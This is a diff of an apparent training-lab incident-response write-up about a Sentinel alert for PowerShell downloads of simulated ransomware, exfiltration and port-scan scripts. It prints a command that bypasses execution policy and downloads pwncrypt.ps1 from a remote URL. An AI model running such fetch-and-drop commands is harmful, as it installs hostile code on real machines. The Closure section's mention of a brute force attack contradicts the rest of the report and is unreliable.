@@ -58,7 +58,7 @@ Another query will be executed against the data in the Log Analytics workspace t
 
 ![image](https://github.com/user-attachments/assets/948e20eb-be81-4d74-988e-39b82bcd0f32)
 
-After the rule was created, we see five entities: the host machine `win-vm-mde` and the different PowerShell commands that were executed.
+After the rule was created, we see five entities: the host machine `win-vm-mde` and the 4 different PowerShell commands that were executed.
 
 
 <img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />
@@ -72,7 +72,7 @@ After the rule was created, we see five entities: the host machine `win-vm-mde` 
 ![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)
 
 
-Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, the user `ylavnu` downloaded four different scripts with 4 different commands on the host machine `win-vm-mde`. The following commands were
+Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, the user `ylavnu` downloaded 4 different scripts with 4 different commands on the host machine `win-vm-mde`. The following commands were
 
 `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 
@@ -92,7 +92,7 @@ Upon investigating the triggered incident `Alert PowerShell Suspicious Web Reque
 The user `ylavnu` was contacted and asked what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software, which resulted in a black screen for a few seconds, and then 'nothing happened' afterwards. 
 
 
-At this point we know the scripts were downloaded but didn't know if they were executed. So we decided to run another query.
+ It is known at this point that the scripts were downloaded but it was not confirmed if they were executed. Another query was run.
 
 
 
@@ -100,13 +100,13 @@ At this point we know the scripts were downloaded but didn't know if they were e
 
 It was determined that the downloaded scripts actually did run. The scripts were then passed off to the malware reverse engineering team. Here were the short descriptions for each script:
 
-portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
+### portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
 
-eicar.ps1: Creates an EICAR test file, which tests antivirus solutions and logs the process.
+### eicar.ps1: Creates an EICAR test file, which tests antivirus solutions and logs the process.
 
-exfiltratedata.ps1: Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.
+### exfiltratedata.ps1: Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.
 
-pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.
+### pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.
 
 
 
@@ -122,15 +122,13 @@ pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ran
 
 - After the machine was returned with no trace of malware, it was removed from isolation.
 
-- 
-
 
 ### **Closure**
 
 The incident response team has reviewed and confirmed the resolution of the event. All containment and remediation steps have been completed, and relevant findings have been documented. This incident has been classified as a `True Positive – Suspicious Activity`. A brute force attack was detected targeting the `win-vm-mde` host. However, all attempts were unsuccessful, and no unauthorised access was achieved.
 
 
-Had the affected user go through extra rounds of cybersecurity awareness training and upgraded the training package from KnowBe4 and increased frequency. Also implemented a policy that restricts the use of PowerShell for non-essential users. This incident has been classified as a `True Positive - Suspicious Activity`. 
+Ordered the affected user go through extra rounds of cybersecurity awareness training and upgraded the training package from KnowBe4 and increased frequency. Also implemented a policy that restricts the use of PowerShell for non-essential users. This incident has been classified as a `True Positive - Suspicious Activity`. The user `ylavnu` downloaded 4 malicious PowerShell scripts from an external URL and executed them in the network environment. However, it was discovered that the user misjudged the contents and effects of the scripts and claimed it was an accident. No further suspected damage or persistence was recognised. 
 
 
 
